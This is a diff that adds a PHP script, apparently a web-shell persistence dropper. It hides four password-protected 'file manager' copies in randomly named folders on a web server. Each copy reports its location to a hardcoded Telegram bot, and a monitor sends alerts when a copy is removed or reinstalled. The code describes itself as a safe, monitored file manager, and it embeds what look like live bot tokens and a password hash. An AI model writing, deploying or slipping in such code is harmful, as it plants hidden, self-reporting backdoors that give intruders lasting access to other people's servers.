@@ -1,0 +1,96 @@
+<?php
+session_start();
+
+// ================= CONFIG =================
+$botManagerToken = "8744397394:AAEFMn-nlGFv5VTu44OV82fVKMrxzWoLpkY"; 
+$botManagerChat  = "8259867883"; 
+
+$botMonitorToken = "8734149550:AAFCXVho8dLaP2551mC6BR8atHDPdNYn7Pg"; 
+$botMonitorChat  = "8259867883"; 
+
+$passHash = '$2a$12$qbUBAVBufBYtIT9KbYq2VeSywq/9N8gXUyETmsOe8dHnxBjXsN.0O';
+
+$numCopies = 4;
+
+// ================= TELEGRAM =================
+function sendTele($msg, $token, $chat_id){
+    @file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
+        'chat_id'=>$chat_id,
+        'text'=>$msg
+    ]));
+}
+
+// ================= SAFE DEPLOY =================
+// Folder deploy khusus, tidak menimpa file lain
+$baseDir = __DIR__ . "/manager_copies";
+if(!file_exists($baseDir)) mkdir($baseDir,0755,true);
+
+// Generate folder acak untuk copy
+$copyDirs=[];
+for($i=1;$i<=$numCopies;$i++){
+    $rand = bin2hex(random_bytes(4));
+    $dir = $baseDir."/manager_$rand";
+    if(!file_exists($dir)) mkdir($dir,0755,true);
+    $copyDirs[] = $dir;
+}
+
+// ================= FILE MANAGER TEMPLATE =================
+$fileManagerName="file_manager.php";
+$managerCode=<<<PHP
+<?php
+session_start();
+\$token='$botManagerToken';
+\$chat_id='$botManagerChat';
+
+// Kirim notif aktif
+if(!isset(\$_SESSION['sent'])){
+    \$msg="🔥 FILE MANAGER AKTIF\\n".__FILE__;
+    file_get_contents("https://api.telegram.org/bot\$token/sendMessage?" . http_build_query(['chat_id'=>\$chat_id,'text'=>\$msg]));
+    \$_SESSION['sent']=true;
+}
+
+// LOGIN
+\$passHash='$passHash';
+if(isset(\$_POST['p']) && password_verify(\$_POST['p'],\$passHash)){
+    \$_SESSION['ok']=true;
+}
+if(!isset(\$_SESSION['ok'])){
+    echo '<form method="post"><input type="password" name="p"><button>Login</button></form>';
+    return;
+}
+
+echo "<h3>📂 File Manager</h3>";
+?>
+PHP;
+
+// ================= DEPLOY FILE MANAGER =================
+foreach($copyDirs as $dir){
+    $filePath=$dir."/".$fileManagerName;
+    if(!file_exists($filePath)){
+        file_put_contents($filePath,$managerCode);
+    }
+}
+
+// ================= MONITOR =================
+$db=__DIR__."/monitor_db.json";
+$old=file_exists($db)?json_decode(file_get_contents($db),true):[];
+
+foreach($copyDirs as $dir){
+    $filePath=$dir."/".$fileManagerName;
+    $exists=file_exists($filePath);
+    $oldStatus=$old[$filePath]['exists']??null;
+
+    if($oldStatus===true && !$exists){
+        sendTele("❌ FILE MANAGER TERHAPUS\n$filePath",$botMonitorToken,$botMonitorChat);
+    }
+    if(($oldStatus===false||$oldStatus===null) && $exists){
+        sendTele("🆕 FILE MANAGER TERPASANG\n$filePath",$botMonitorToken,$botMonitorChat);
+    }
+
+    $new[$filePath]=['exists'=>$exists];
+}
+
+file_put_contents($db,json_encode($new));
+
+echo "<p>✅ File manager aman dan dipantau di folder khusus.</p>";
+?>
